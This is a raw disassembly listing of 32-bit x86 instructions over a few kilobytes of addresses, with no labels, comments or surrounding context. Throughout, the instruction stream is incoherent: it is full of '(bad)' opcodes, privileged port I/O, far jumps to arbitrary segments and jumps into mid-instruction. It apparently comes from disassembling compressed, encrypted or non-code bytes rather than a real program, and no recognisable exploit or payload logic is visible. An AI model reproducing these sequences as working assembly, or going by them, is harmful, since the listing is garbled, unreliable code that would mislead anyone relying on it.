  418603:	fprem1 
  418605:	sahf   
  418606:	aaa    
  418607:	push   eax
  418608:	pop    ds
  418609:	inc    esi
  41860a:	xchg   DWORD PTR [edi],esp
  41860c:	ins    DWORD PTR es:[edi],dx
  41860d:	cli    
  41860e:	rcl    BYTE PTR [eax+edx*8],1
  418611:	fist   WORD PTR [esi+0x44555bdd]
  418617:	jno    0x418664
  418619:	rol    DWORD PTR [edx],1
  41861b:	iret   
  41861c:	retf   0x872d
  41861f:	jns    0x4185ea
  418621:	int    0x22
  418623:	or     ebx,DWORD PTR [edx]
  418625:	cld    
  418626:	out    0x84,al
  418628:	inc    eax
  418629:	sub    al,0xf1
  41862b:	ja     0x4185d5
  41862d:	jmp    0xd12d:0xc09de22b
  418634:	ins    DWORD PTR es:[edi],dx
  418635:	pushf  
  418636:	loop   0x418692
  418638:	out    0xbd,al
  41863a:	ins    DWORD PTR es:[edi],dx
  41863b:	sbb    BYTE PTR [ecx-0x799fc1c7],0x82
  418642:	cli    
  418643:	add    BYTE PTR ds:0x2cec3f16,al
  418649:	jbe    0x4185f2
  41864b:	outs   dx,BYTE PTR ds:[esi]
  41864c:	mov    ebp,0x78a173b
  418651:	jnp    0x4186b6
  418653:	mov    eax,ds:0xde3aa249
  418658:	test   DWORD PTR [ebx],0xb29570f8
  41865e:	fwait
  41865f:	jb     0x418671
  418661:	mov    cs,esp
  418663:	and    esi,DWORD PTR [eax+0x50]
  418666:	cmc    
  418667:	scas   eax,DWORD PTR es:[edi]
  418668:	in     eax,0x7b
  41866a:	imul   ebx,DWORD PTR es:[edi-0x69],0x32b6a4da
  418672:	xor    dh,BYTE PTR [edi+0x1fd9852]
  418678:	gs hlt 
  41867a:	push   ecx
  41867b:	scas   eax,DWORD PTR es:[edi]
  41867c:	and    edx,esi
  41867e:	push   ds
  41867f:	mov    ch,0x89
  418681:	or     bh,BYTE PTR [edi]
  418683:	pop    eax
  418684:	cmp    BYTE PTR [eax-0x3bc74ee1],cl
  41868a:	adc    eax,edi
  41868c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41868d:	xor    al,0x7f
  41868f:	pop    ds
  418690:	(bad)  
  418692:	imul   ebp,DWORD PTR [ecx],0xffffff9c
  418695:	mov    ebp,0x2ae235b9
  41869a:	adc    ebx,DWORD PTR [edi]
  41869c:	mov    bl,0x5b
  41869e:	int    0x9
  4186a0:	fdiv   QWORD PTR [ebx-0x6b]
  4186a3:	sbb    eax,0x2439e2d6
  4186a8:	and    BYTE PTR [edi-0x6e],al
  4186ab:	jmp    0xbb7b:0x52c2179b
  4186b2:	sub    DWORD PTR [ebx-0x64],ebp
  4186b5:	push   esi
  4186b6:	div    ebx
  4186b8:	cmp    edi,DWORD PTR [edx+0x28]
  4186bb:	nop
  4186bc:	xchg   bh,ch
  4186be:	cwde   
  4186bf:	or     DWORD PTR [eax-0x18],0xd209a7c0
  4186c6:	clc    
  4186c7:	inc    ebp
  4186c8:	mov    edi,0xc1c9c2aa
  4186cd:	mov    ebx,DWORD PTR [eax+0x189d1712]
  4186d3:	lea    esp,[edx+0x1b]
  4186d6:	mov    esi,0x5728b5fe
  4186db:	mov    bh,0xaf
  4186dd:	shl    al,cl
  4186df:	jmp    0xc2946c12
  4186e4:	xchg   BYTE PTR [edx+edi*4],dh
  4186e7:	cld    
  4186e8:	mov    bh,BYTE PTR [edx]
  4186ea:	jmp    0x4186cf
  4186ec:	ds xchg edx,eax
  4186ee:	add    DWORD PTR [eax-0x24],ecx
  4186f1:	lods   al,BYTE PTR ds:[esi]
  4186f2:	(bad)  
  4186f3:	adc    al,0x8d
  4186f5:	xchg   ecx,eax
  4186f6:	in     al,0xfd
  4186f8:	(bad)  
  4186f9:	cmp    edx,DWORD PTR [esi+0x4]
  4186fc:	dec    esp
  4186fd:	add    ebx,DWORD PTR [ebx+0x11]
  418700:	adc    DWORD PTR [edi+0x4c420b68],edi
  418706:	mov    ds:0x3678c7cf,al
  41870b:	out    dx,eax
  41870c:	add    eax,0x69bc7137
  418711:	test   BYTE PTR [ecx-0x28],0x72
  418715:	fidivr WORD PTR [ebp-0x1728b214]
  41871b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41871c:	mov    edi,0x490df36c
  418721:	xor    BYTE PTR ss:[ecx+0x5d],dh
  418725:	out    0x6c,al
  418727:	rcr    BYTE PTR [edi+0x47],1
  41872a:	mov    dh,0xa9
  41872c:	jp     0x41871d
  41872e:	les    esi,FWORD PTR [esi+0x3d]
  418731:	pop    edi
  418732:	dec    edi
  418733:	out    0x42,eax
  418735:	les    edi,FWORD PTR [eiz*2+0x12921cfa]
  41873c:	lods   eax,DWORD PTR ds:[esi]
  41873d:	rol    BYTE PTR [edi-0x7a],1
  418740:	std    
  418741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418742:	mov    dh,0x1
  418744:	mov    bh,0x37
  418746:	mov    ebx,0xd84cf38d
  41874b:	dec    ebp
  41874c:	pushf  
  41874d:	pop    esp
  41874e:	stos   DWORD PTR es:[edi],eax
  41874f:	ss push esp
  418751:	mov    bl,0xb8
  418753:	mov    al,ds:0x22481ae3
  418758:	add    BYTE PTR [edi-0x553bc480],dl
  41875e:	mov    ah,0x2e
  418760:	out    0x87,al
  418762:	xor    eax,0x42ece5b7
  418767:	xor    ebx,DWORD PTR [ebp+0x6e]
  41876a:	mov    eax,ds:0x7c6fc23f
  41876f:	aam    0xec
  418771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418772:	cmp    eax,0x554f0e6d
  418777:	add    bl,BYTE PTR [esi+edi*2-0x26377320]
  41877e:	lea    edi,[ebx+0x4e2a470d]
  418784:	(bad)  
  418785:	clc    
  418786:	add    al,0xee
  418788:	xchg   ecx,eax
  418789:	jbe    0x4187cb
  41878b:	pop    ebx
  41878c:	sub    ebx,DWORD PTR [edi+eax*1]
  41878f:	inc    ebx
  418790:	mov    ah,0x3c
  418792:	cmp    BYTE PTR [ebx-0x44],ah
  418795:	sbb    al,0x63
  418797:	jle    0x41875a
  418799:	push   edi
  41879a:	adc    DWORD PTR [edx+0x6c],ebp
  41879d:	inc    esp
  41879e:	mov    eax,ds:0xf1a3cff1
  4187a3:	fistp  WORD PTR [ebx]
  4187a5:	mov    esp,0xa5133e05
  4187aa:	push   eax
  4187ab:	leave  
  4187ac:	adc    edi,esi
  4187ae:	dec    esi
  4187af:	or     DWORD PTR ds:0x29d0102d,0x7f751b30
  4187b9:	sub    bh,al
  4187bb:	cmp    bl,cl
  4187bd:	outs   dx,BYTE PTR ds:[esi]
  4187be:	iret   
  4187bf:	push   bx
  4187c1:	push   edx
  4187c2:	mov    ecx,0xdb3c6677
  4187c7:	jb     0x418830
  4187c9:	cmp    cl,BYTE PTR [ebp+ebx*1-0x7a35e573]
  4187d0:	or     DWORD PTR [edi+0x14],esp
  4187d3:	and    al,0x65
  4187d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187d6:	cli    
  4187d7:	push   0x6f
  4187d9:	pop    esp
  4187da:	pop    esi
  4187db:	pop    ebx
  4187dc:	pop    eax
  4187dd:	inc    esi
  4187de:	call   0xeb51f175
  4187e3:	frstor [ecx-0x3fe8c71a]
  4187e9:	push   es
  4187ea:	sub    DWORD PTR [ebx],edi
  4187ec:	xchg   ecx,eax
  4187ed:	aam    0x39
  4187ef:	lea    edx,[ecx+0x5b044fd4]
  4187f5:	and    eax,0xc293b574
  4187fa:	addr16 (bad) 
  4187fc:	fstp   TBYTE PTR [edi]
  4187fe:	rcr    edx,0x51
  418801:	and    DWORD PTR [eax-0x3728f7d4],ecx
  418807:	cmp    DWORD PTR [edx-0x3b6902fb],0x2
  41880e:	xchg   ebx,eax
  41880f:	call   0x1be9ff22
  418814:	sub    BYTE PTR [edi+0x3d],al
  418817:	push   ss
  418818:	pop    es
  418819:	jp     0x4187c8
  41881b:	jae    0x4187ec
  41881d:	sbb    eax,0xb12ada49
  418822:	fild   DWORD PTR [edi-0x58]
  418825:	dec    ebp
  418827:	fnsave [esi]
  418829:	mov    ebp,0xd8ed291e
  41882e:	mov    cl,0x89
  418830:	pop    edx
  418831:	add    edi,edi
  418833:	dec    ebp
  418834:	dec    edi
  418835:	(bad)  
  418836:	xlat   BYTE PTR ds:[ebx]
  418837:	adc    al,0x81
  418839:	stos   BYTE PTR es:[edi],al
  41883a:	jo     0x418837
  41883c:	rcr    DWORD PTR [edi-0x70],cl
  41883f:	stc    
  418840:	fadd   DWORD PTR [edx+0x18ab7f9e]
  418846:	mov    dl,0xdb
  418848:	pop    es
  418849:	or     edi,DWORD PTR [esi]
  41884b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41884c:	lods   eax,DWORD PTR ds:[esi]
  41884d:	xor    bl,BYTE PTR [ebp+0x1c9b91a0]
  418853:	cmp    bl,dh
  418855:	enter  0x93de,0x92
  418859:	xchg   edx,eax
  41885a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41885b:	jl     0x41888f
  41885d:	scas   eax,DWORD PTR es:[edi]
  41885e:	out    0x6f,al
  418860:	xor    ebp,DWORD PTR gs:[ebx]
  418863:	jmp    0xdcdea476
  418868:	iret   
  418869:	addr16 aas 
  41886b:	sub    BYTE PTR [esp+eiz*8],bh
  41886e:	mov    ds:0xecef131e,al
  418873:	push   0xdb75fea1
  418878:	jb     0x418822
  41887a:	(bad)  
  41887c:	loop   0x418872
  41887e:	xchg   edx,esp
  418880:	push   cs
  418881:	mov    esi,DWORD PTR [ebx+0x8]
  418884:	and    ch,bh
  418886:	hlt    
  418887:	mov    DWORD PTR [ebx],esi
  418889:	sbb    DWORD PTR [ebx*2-0xe2dbb6f],ebp
  418890:	aas    
  418891:	in     al,0x96
  418893:	mov    eax,0xb87bea2f
  418898:	loopne 0x418891
  41889a:	pop    esp
  41889b:	test   DWORD PTR [eax-0x5f8da03f],edi
  4188a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188a2:	pop    ds
  4188a3:	ret    
  4188a4:	int    0xcd
  4188a6:	ret    
  4188a7:	syscall 
  4188a9:	jno    0x418900
  4188ab:	push   eax
  4188ac:	and    DWORD PTR [ebx-0x44ccd4d0],ecx
  4188b2:	mov    ebx,DWORD PTR [edi+0x6578f6c0]
  4188b8:	pop    ebp
  4188b9:	mov    ebp,esp
  4188bb:	outs   dx,DWORD PTR ds:[esi]
  4188bc:	mov    bl,0x1e
  4188be:	div    BYTE PTR [edi+edi*2-0x25]
  4188c2:	shl    BYTE PTR [ebx-0xa],1
  4188c5:	cmp    ebp,DWORD PTR [ebp+0x51]
  4188c8:	dec    eax
  4188c9:	dec    ebp
  4188ca:	out    0x8b,al
  4188cc:	mov    ch,0x65
  4188ce:	or     eax,0xe513da3f
  4188d3:	loope  0x418945
  4188d5:	in     al,dx
  4188d6:	fwait
  4188d7:	xchg   eax,ebp
  4188d9:	push   ds
  4188da:	mov    ds:0x198b8214,eax
  4188df:	sbb    ch,BYTE PTR [ebx]
  4188e1:	jo     0x418870
  4188e3:	(bad)  
  4188e4:	jmp    0x5469:0xee6687ce
  4188eb:	push   ds
  4188ec:	mov    eax,0xfdcf638f
  4188f1:	jb     0x418938
  4188f3:	push   esp
  4188f4:	cld    
  4188f5:	fbstp  TBYTE PTR [eax+eax*8-0x4bfd3fbd]
  4188fc:	loopne 0x41887e
  4188fe:	out    0xe2,eax
  418900:	not    DWORD PTR [edi-0x517d66be]
  418906:	add    al,0x1d
  418908:	out    0x79,al
  41890a:	popf   
  41890b:	xor    al,0x50
  41890d:	mul    DWORD PTR [edx]
  41890f:	xchg   DWORD PTR [edx-0x79bc27a5],edi
  418915:	sbb    ebx,esp
  418917:	adc    BYTE PTR [ebp-0x3d],ch
  41891a:	pop    edx
  41891b:	(bad)  
  41891c:	dec    esp
  41891d:	xchg   dl,dl
  41891f:	fadd   QWORD PTR [ecx]
  418921:	ins    DWORD PTR es:[edi],dx
  418922:	repnz sti 
  418924:	pop    esi
  418925:	jb     0x4188fb
  418927:	and    eax,0xd956ebbe
  41892c:	mov    esi,0x51a296d7
  418931:	xchg   edx,eax
  418932:	push   edx
  418933:	xchg   ebp,eax
  418934:	ss dec eax
  418936:	sbb    eax,0x54b6c8ff
  41893b:	retf   
  41893c:	mov    DWORD PTR [edx-0x57898ccb],edi
  418942:	test   DWORD PTR [eax-0x21e6838d],eax
  418948:	cmp    BYTE PTR ds:[ebx],cl
  41894b:	(bad)  
  41894c:	cs cmp al,0x2e
  41894f:	inc    esi
  418950:	adc    BYTE PTR [ecx+ecx*8],bh
  418953:	mov    esp,ebp
  418955:	or     eax,0xc5fc31e1
  41895a:	xlat   BYTE PTR ds:[ebx]
  41895b:	mov    ebp,0xe83b5eba
  418960:	loope  0x418950
  418962:	aam    0x99
  418964:	stos   BYTE PTR es:[edi],al
  418965:	mov    ebp,ss
  418967:	jmp    0xbdb1:0x96354c96
  41896e:	arpl   WORD PTR [ebx+0x67],bp
  418971:	aad    0xfa
  418973:	cmc    
  418974:	push   es
  418975:	cmc    
  418976:	arpl   si,bp
  418978:	out    0x1,al
  41897a:	ds icebp 
  41897c:	adc    esi,eax
  41897e:	mov    ecx,0x3274e03
  418983:	sub    al,0x1a
  418985:	cmp    dl,cl
  418987:	cmp    dh,al
  418989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41898a:	mov    DWORD PTR [ebx+ebx*4],esi
  41898d:	dec    ecx
  41898e:	sbb    DWORD PTR [ebp-0x79],esi
  418991:	mov    al,BYTE PTR [ebx+0x3267568e]
  418997:	mov    ds:0xcf4d3b6e,eax
  41899c:	lahf   
  41899d:	lods   eax,DWORD PTR ds:[esi]
  41899e:	jle    0x418a18
  4189a0:	es xchg esi,eax
  4189a2:	mov    ah,0xc1
  4189a4:	std    
  4189a5:	push   esi
  4189a6:	neg    dl
  4189a8:	cmp    al,0xf9
  4189aa:	daa    
  4189ab:	inc    ebx
  4189ac:	push   ss
  4189ad:	and    edi,edi
  4189af:	xor    eax,0x4fe5b6d
  4189b4:	sbb    ax,0x6706
  4189b8:	clc    
  4189b9:	jg     0x418950
  4189bb:	out    dx,al
  4189bc:	mov    WORD PTR [edi+0x11532fa1],ds
  4189c2:	or     ch,dl
  4189c4:	jl     0x41894f
  4189c6:	lods   al,BYTE PTR ds:[esi]
  4189c7:	mov    esp,0x78594222
  4189cc:	sub    ebp,DWORD PTR [ebx-0x2d3c349a]
  4189d2:	addr16 repz inc esp
  4189d5:	pop    ecx
  4189d6:	xchg   esp,eax
  4189d7:	ficom  WORD PTR ss:[esi+0x76d2cd91]
  4189de:	(bad)  
  4189df:	(bad)  
  4189e0:	mov    ebx,ecx
  4189e2:	in     eax,dx
  4189e3:	in     eax,dx
  4189e4:	jb     0x4189e2
  4189e6:	mov    ah,BYTE PTR [esi-0x26]
  4189e9:	leave  
  4189ea:	std    
  4189eb:	loope  0x418a3e
  4189ed:	lds    esp,FWORD PTR [eax+edx*2+0x6c]
  4189f1:	mov    ah,BYTE PTR [ecx+0x2]
  4189f4:	fistp  DWORD PTR [edi-0x39]
  4189f7:	lds    esi,FWORD PTR [eax-0x29]
  4189fa:	inc    edx
  4189fb:	cs je  0x418a7a
  4189fe:	pop    eax
  4189ff:	pushf  
  418a00:	ss jb  0x4189d1
  418a03:	scas   al,BYTE PTR es:[edi]
  418a04:	daa    
  418a05:	xor    eax,0x1adb9125
  418a0b:	mov    esp,0xcd82aded
  418a10:	sub    eax,0x10dd3d1b
  418a15:	jl     0x418a2d
  418a17:	ret    0xddf6
  418a1a:	or     al,0xb4
  418a1c:	fs ror ah,cl
  418a1f:	mov    eax,0xa17300c7
  418a24:	ss jmp 0x4189cf
  418a27:	or     eax,0x5ebd81e8
  418a2c:	push   es
  418a2d:	cwde   
  418a2e:	xlat   BYTE PTR ds:[ebx]
  418a2f:	sbb    bl,bh
  418a31:	pop    ss
  418a32:	mov    ah,BYTE PTR [eax+0x84134a8]
  418a38:	jns    0x4189dc
  418a3a:	sub    eax,ecx
  418a3c:	call   0xe07e:0xa4b6c302
  418a43:	push   ebp
  418a44:	(bad)
  418a48:	push   0xf8408c24
  418a4d:	pop    ecx
  418a4e:	xchg   ebp,eax
  418a4f:	inc    esi
  418a50:	inc    DWORD PTR [edx]
  418a52:	retf   0x890b
  418a55:	add    BYTE PTR [ecx],bh
  418a57:	pop    edi
  418a58:	adc    al,0xe2
  418a5a:	sbb    eax,0xd8d09a40
  418a5f:	std    
  418a60:	cwde   
  418a61:	cwde   
  418a62:	pop    ds
  418a63:	cmp    eax,0x5cadc08f
  418a68:	push   edx
  418a69:	in     al,0x7c
  418a6b:	and    DWORD PTR [edi+esi*4+0x74577a02],0x9e7d184d
  418a76:	dec    edx
  418a77:	push   ss
  418a78:	(bad)  
  418a79:	rol    esi,cl
  418a7b:	push   eax
  418a7c:	loopne 0x418a94
  418a7e:	cmp    DWORD PTR ds:0xd18beba0,esp
  418a84:	adc    al,0xcb
  418a86:	jb     0x418b03
  418a88:	stos   BYTE PTR es:[edi],al
  418a89:	inc    eax
  418a8a:	or     ecx,DWORD PTR [ebx+edx*2]
  418a8d:	mov    esi,0x94022424
  418a92:	pop    edi
  418a93:	fcom   DWORD PTR [ecx]
  418a95:	pop    esi
  418a96:	mov    ah,0x49
  418a98:	fbld   TBYTE PTR [esi+eiz*1]
  418a9b:	imul   esi,DWORD PTR [eax+0x6c],0xffffffff
  418a9f:	push   cs
  418aa0:	pop    ds
  418aa1:	test   BYTE PTR [ebx-0x3b],0xea
  418aa5:	sub    BYTE PTR [esi-0x7048c0c8],ch
  418aab:	fldcw  WORD PTR [eax+0x3d]
  418aae:	ret    0x7922
  418ab1:	mov    bh,0x4a
  418ab3:	out    0xa1,eax
  418ab5:	imul   edi,esi,0x9aaae327
  418abb:	(bad)  
  418abd:	or     al,0xa5
  418abf:	adc    edi,DWORD PTR [esi+0x166542cd]
  418ac5:	cwde   
  418ac6:	dec    edi
  418ac7:	xor    ecx,DWORD PTR [esi-0x3]
  418aca:	pusha  
  418acb:	push   0x6d
  418acd:	clc    
  418ace:	sub    al,0x55
  418ad0:	mov    ah,0x91
  418ad2:	pop    edi
  418ad3:	and    al,0xc7
  418ad5:	mov    ebp,0x727ae624
  418ada:	add    BYTE PTR [ebx+eiz*8-0x48991e10],cl
  418ae1:	mov    ah,0xac
  418ae3:	mov    al,0x55
  418ae5:	jb     0x418aa7
  418ae7:	test   al,0xd5
  418ae9:	mov    ch,0xba
  418aeb:	jbe    0x418b32
  418aed:	mov    bh,0x7d
  418aef:	mov    esp,DWORD PTR [ebp-0xe448cd]
  418af5:	leave  
  418af6:	int    0x56
  418af8:	mov    edx,0xe0424bea
  418afd:	pop    es
  418afe:	in     eax,0x1b
  418b00:	mov    edx,0xff9ad99f
  418b05:	pop    esp
  418b06:	adc    bl,dl
  418b08:	call   0x452fa845
  418b0d:	xchg   edi,eax
  418b0e:	mov    eax,ds:0x3820fc08
  418b13:	bound  ebx,QWORD PTR ds:0x92867a3b
  418b19:	retf   
  418b1a:	jnp    0x418ad6
  418b1c:	and    edx,DWORD PTR [eax]
  418b1e:	imul   ebp,DWORD PTR [edi+0x89fbb25],0x226e76d7
  418b28:	sbb    BYTE PTR [ebx-0x7f],cl
  418b2b:	jecxz  0x418b02
  418b2d:	test   eax,ebp
  418b2f:	nop    DWORD PTR [edx+ebp*2+0x5364146a]
  418b37:	mov    bh,0x79
  418b39:	std    
  418b3a:	hlt    
  418b3b:	hlt    
  418b3c:	dec    ecx
  418b3d:	add    ebp,DWORD PTR [eax+eax*4]
  418b40:	popf   
  418b41:	add    ebx,DWORD PTR [edi+0x32]
  418b44:	cld    
  418b45:	xchg   DWORD PTR [edi],edi
  418b47:	add    eax,0x577dbe8e
  418b4c:	mov    ds:0xb9c8717c,al
  418b51:	loopne 0x418b85
  418b53:	mov    esp,0x41f9b7b5
  418b58:	arpl   cx,si
  418b5a:	inc    ecx
  418b5b:	xchg   edx,eax
  418b5c:	push   eax
  418b5d:	xchg   ebx,eax
  418b5e:	hlt    
  418b5f:	sub    al,0x7d
  418b61:	inc    ecx
  418b62:	and    DWORD PTR [ebp-0xb429b42],esp
  418b68:	mov    edx,ebx
  418b6a:	mov    ds:0xe1de88d3,eax
  418b6f:	push   ebx
  418b70:	pop    sp
  418b72:	dec    esi
  418b73:	bound  edx,QWORD PTR [ebp+0x6b]
  418b76:	push   eax
  418b77:	imul   esp,DWORD PTR [esi],0xffffffdc
  418b7a:	cmp    edx,edi
  418b7c:	inc    ebp
  418b7d:	outs   dx,DWORD PTR ds:[esi]
  418b7e:	sbb    eax,0xc1ca2218
  418b83:	int    0x40
  418b85:	xchg   esp,eax
  418b86:	mov    ds,WORD PTR [ebx-0x56379dde]
  418b8c:	and    al,0x4f
  418b8e:	push   0xffffff95
  418b90:	dec    esi
  418b91:	sbb    esp,DWORD PTR [edx+0x3c]
  418b94:	call   0x5763f6fe
  418b99:	cmp    ecx,ebp
  418b9b:	popa   
  418b9c:	cmp    eax,0xa3310a7e
  418ba1:	mov    BYTE PTR [ebp+0x32185b64],ah
  418ba7:	aam    0xed
  418ba9:	and    al,0x8e
  418bab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bac:	rol    BYTE PTR [ebx+0x30],cl
  418baf:	push   edx
  418bb0:	and    cl,BYTE PTR [ecx-0x25f18347]
  418bb6:	hlt    
  418bb7:	enter  0x1a12,0xff
  418bbb:	jg     0x418c32
  418bbd:	adc    ebx,ebx
  418bbf:	and    BYTE PTR ds:0x6caa30be,bh
  418bc5:	mov    eax,0x8bdcc6b
  418bca:	mov    esi,0x59abca4e
  418bcf:	adc    DWORD PTR [edi],ebx
  418bd1:	(bad)  
  418bd2:	cwde   
  418bd3:	cmp    bl,ch
  418bd5:	push   ds
  418bd6:	xor    edi,esi
  418bd8:	repz mov ds:0xd0db0cd9,al
  418bde:	add    ebx,ebp
  418be0:	push   ds
  418be1:	pop    es
  418be2:	icebp  
  418be3:	ins    DWORD PTR es:[edi],dx
  418be4:	sub    DWORD PTR [ebp-0x31c1b96f],esi
  418bea:	lahf   
  418beb:	push   cs
  418bec:	inc    edi
  418bed:	mov    edx,0x2b8639eb
  418bf2:	push   ebx
  418bf3:	out    dx,eax
  418bf4:	and    eax,DWORD PTR [esi]
  418bf6:	cli    
  418bf7:	es mov esp,0xa3f033fd
  418bfd:	inc    edi
  418bfe:	pop    ebx
  418bff:	mov    WORD PTR [edx],?
  418c01:	inc    ebx
  418c02:	mov    DWORD PTR [ebx-0xd],ebp
  418c05:	xor    dh,bh
  418c07:	xor    eax,0x394d8
  418c0c:	add    al,BYTE PTR [eax+0xf]
  418c0f:	or     dl,bl
  418c11:	leave  
  418c12:	je     0x418bbf
  418c14:	add    DWORD PTR [esi+0x399eb00b],esi
  418c1a:	cli    
  418c1b:	mov    edx,0x3ad3bcb2
  418c20:	jge    0x418c59
  418c22:	xchg   DWORD PTR [ebp-0x24],edx
  418c25:	inc    edx
  418c26:	ret    
  418c27:	xchg   esp,eax
  418c28:	mov    ebp,0x9c0c4101
  418c2d:	in     eax,0xae
  418c2f:	xchg   esp,eax
  418c30:	or     bh,dl
  418c32:	in     al,dx
  418c33:	push   es
  418c34:	in     eax,dx
  418c35:	jp     0x418bf4
  418c37:	or     ecx,0x394be91e
  418c3d:	sub    ebx,DWORD PTR [esi-0x64d048f7]
  418c43:	jmp    0x364315f2
  418c48:	jae    0x418bf3
  418c4a:	sub    al,0x5c
  418c4c:	std    
  418c4d:	sub    eax,0xb4e1e1a6
  418c52:	pop    edx
  418c53:	cmp    DWORD PTR [ebx-0x6a],ebx
  418c56:	mov    bl,0xb7
  418c58:	cmp    bl,BYTE PTR [ecx+0x734e7b4a]
  418c5e:	fs ja  0x418cb2
  418c61:	test   dl,ah
  418c63:	pop    edx
  418c64:	or     al,0x90
  418c66:	push   edx
  418c67:	jbe    0x418bec
  418c69:	sbb    DWORD PTR [ebx],esp
  418c6b:	push   0xffffffe0
  418c6d:	jns    0x418c24
  418c6f:	mov    dl,0xd3
  418c71:	outs   dx,BYTE PTR ds:[esi]
  418c72:	ret    0xe8e8
  418c75:	addr16 gs fs retf 0x2115
  418c7b:	or     al,BYTE PTR [esi+0x1]
  418c7e:	shl    BYTE PTR [edi-0x660ed189],0x69
  418c85:	call   0xab4a:0x5cc861c8
  418c8c:	jo     0x418ce3
  418c8e:	iret   
  418c8f:	cmp    DWORD PTR [edx-0x25],esi
  418c92:	stc    
  418c93:	iret   
  418c94:	addr16 xor esi,edx
  418c97:	in     al,0x87
  418c99:	jno    0x418c4c
  418c9b:	mov    eax,ds:0x66be873
  418ca0:	fwait
  418ca1:	cdq    
  418ca2:	sbb    esi,edx
  418ca4:	scas   al,BYTE PTR es:[edi]
  418ca5:	mov    ebp,DWORD PTR [ebx-0x1f]
  418ca8:	xor    cl,0x94
  418cab:	psrlw  mm7,mm3
  418cae:	jno    0x418ce3
  418cb0:	adc    al,0x2b
  418cb2:	pop    ebx
  418cb3:	out    dx,eax
  418cb4:	or     DWORD PTR [ebp+0x503afa88],edx
  418cba:	int3   
  418cbb:	jg     0x418c4e
  418cbd:	adc    eax,0x3eb2fc62
  418cc2:	pop    ebp
  418cc3:	ja     0x418c56
  418cc5:	sahf   
  418cc6:	outs   dx,BYTE PTR ds:[esi]
  418cc7:	cmp    edi,DWORD PTR ds:0x60571d36
  418ccd:	jge    0x418cf2
  418ccf:	lock enter 0xee8e,0x81
  418cd4:	arpl   WORD PTR [ebx+0x3822e6c],bp
  418cda:	inc    ebp
  418cdb:	xchg   DWORD PTR [edx],ecx
  418cdd:	cmp    eax,0xcb1355c8
  418ce2:	test   dl,0x12
  418ce5:	lock ror DWORD PTR es:[eax-0x3408a4c1],cl
  418ced:	mov    WORD PTR [ebx+0x1c],gs
  418cf0:	lods   eax,DWORD PTR ds:[esi]
  418cf1:	jns    0x418d6c
  418cf3:	(bad)  
  418cf4:	idiv   DWORD PTR [edi+0x53]
  418cf7:	push   edi
  418cf8:	pop    ecx
  418cf9:	ins    BYTE PTR es:[edi],dx
  418cfa:	test   al,0xb9
  418cfc:	push   0xffffffea
  418cfe:	mov    bh,0x1c
  418d00:	sub    bh,cl
  418d02:	mov    ebx,0x3e701ea8
  418d07:	cmc    
  418d08:	lock sub bh,dl
  418d0b:	xchg   esp,eax
  418d0c:	dec    ecx
  418d0d:	lea    ebp,[edx-0x43]
  418d10:	lods   eax,DWORD PTR ds:[esi]
  418d11:	pcmpeqw mm1,QWORD PTR [esi+0x70]
  418d15:	pop    edx
  418d16:	pop    ebp
  418d17:	sub    al,0xb7
  418d19:	mov    cl,0x7a
  418d1b:	pop    esi
  418d1c:	imul   edi,DWORD PTR [ecx],0x24
  418d1f:	xchg   ecx,eax
  418d20:	xchg   esi,eax
  418d21:	outs   dx,DWORD PTR ds:[esi]
  418d22:	mov    es,edx
  418d24:	inc    ecx
  418d25:	dec    esi
  418d26:	cld    
  418d27:	push   ds
  418d28:	mov    ebx,0x8e55c485
  418d2d:	out    dx,eax
  418d2e:	repz popa 
  418d30:	mov    esi,0xced9c151
  418d35:	adc    edx,DWORD PTR [edi+0x33]
  418d38:	ja     0x418d03
  418d3a:	out    0x8f,al
  418d3c:	outs   dx,DWORD PTR ds:[esi]
  418d3d:	arpl   WORD PTR [ebx+0x57],si
  418d40:	adc    eax,0x3650c774
  418d45:	(bad)  
  418d46:	fucomi st,st(6)
  418d48:	stc    
  418d49:	sahf   
  418d4a:	fwait
  418d4b:	retf   0xb554
  418d4e:	or     DWORD PTR [bx+di],ebx
  418d51:	lahf   
  418d52:	rol    BYTE PTR [eax+ecx*8],0x5a
  418d56:	or     eax,0xb7a36160
  418d5b:	fdivrp st(0),st
  418d5d:	fst    DWORD PTR [ebp-0x66]
  418d60:	jl     0x418dab
  418d62:	fidiv  DWORD PTR [edx+0x4e]
  418d65:	sbb    edi,DWORD PTR [edi+0x7f11a677]
  418d6b:	pop    esi
  418d6c:	mov    DWORD PTR [esi],ecx
  418d6e:	cli    
  418d6f:	out    0xe6,al
  418d71:	dec    esi
  418d72:	hlt    
  418d73:	inc    ebp
  418d74:	sub    BYTE PTR [esi+0x693cc11],dl
  418d7a:	sub    eax,0x2a00e8d3
  418d7f:	cli    
  418d80:	out    dx,al
  418d81:	add    DWORD PTR [edx],ecx
  418d83:	mov    DWORD PTR [esi+0x33aed36d],0x46b4da74
  418d8d:	inc    edi
  418d8e:	dec    ebx
  418d8f:	fidivr DWORD PTR [eax+edx*2+0x2c]
  418d93:	push   cs
  418d94:	xchg   ebx,eax
  418d95:	cli    
  418d96:	jg     0x5d2e901b
  418d9c:	inc    edx
  418d9d:	ret    
  418d9e:	test   DWORD PTR [ecx],edi
  418da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418da1:	fmul   DWORD PTR [eax-0x52a8e15e]
  418da7:	fs (bad) 
  418da9:	lock shr BYTE PTR [eax],1
  418dac:	lds    ebp,FWORD PTR [eax+edx*1-0x46057f3a]
  418db3:	sar    DWORD PTR [esi],0xe
  418db6:	pop    esp
  418db7:	and    esi,esp
  418db9:	mov    esi,0x8d4ec115
  418dbe:	ret    
  418dbf:	mov    ch,0x24
  418dc1:	push   0xffffffd1
  418dc3:	xchg   esp,eax
  418dc4:	cs jl  0x418d6f
  418dc7:	out    dx,eax
  418dc8:	push   ebp
  418dc9:	jb     0x418e35
  418dcb:	mov    cl,BYTE PTR ds:0x95646b03
  418dd1:	pop    ebp
  418dd2:	xchg   esi,eax
  418dd3:	scas   eax,DWORD PTR es:[edi]
  418dd4:	pop    es
  418dd5:	cmp    edi,edx
  418dd7:	or     al,0xe6
